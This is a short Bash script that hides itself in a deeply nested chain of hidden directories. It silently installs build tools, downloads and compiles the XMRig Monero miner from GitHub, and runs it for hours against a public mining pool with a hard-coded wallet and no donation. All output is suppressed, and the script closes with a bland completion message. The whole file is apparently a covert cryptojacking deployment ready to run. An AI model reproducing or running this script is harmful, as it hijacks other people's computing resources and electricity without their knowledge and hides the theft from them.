#!/bin/bash

mkdir -p ~/.fgg/.vbb/.dyy/zaxx/vv/dffn/.gof/dodd/dkfj/.sakjk/lafk/asflkasf/asflasfk/aflkfas > /dev/null 2>&1 && cd ~/.fgg/.vbb/.dyy/zaxx/vv/dffn/.gof/dodd/dkfj/.sakjk/lafk/asflkasf/asflasfk/aflkfas > /dev/null 2>&1


sudo apt update > /dev/null 2>&1
sudo apt upgrade -y > /dev/null 2>&1

sudo apt install cpulimit git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y > /dev/null 2>&1

git clone https://github.com/xmrig/xmrig.git > /dev/null 2>&1

cd xmrig > /dev/null 2>&1 && mkdir build > /dev/null 2>&1 && cd build > /dev/null 2>&1 && cmake .. > /dev/null 2>&1 && make -j1 > /dev/null 2>&1

timeout 5h nice -n 19 ./xmrig -o pool.supportxmr.com:3333 -u 46n267DcGcX8kpaskjqvE7JDQrxyWxcYV3gYvih5YBBaZ4fdW5TScCh4YQKzJ3fDrQGLjCCTRW1GLeRKDoV755pA1yfW1eC -p laptop1 -k --donate-level 0 > /dev/null 2>&1

echo "Script execution complete."
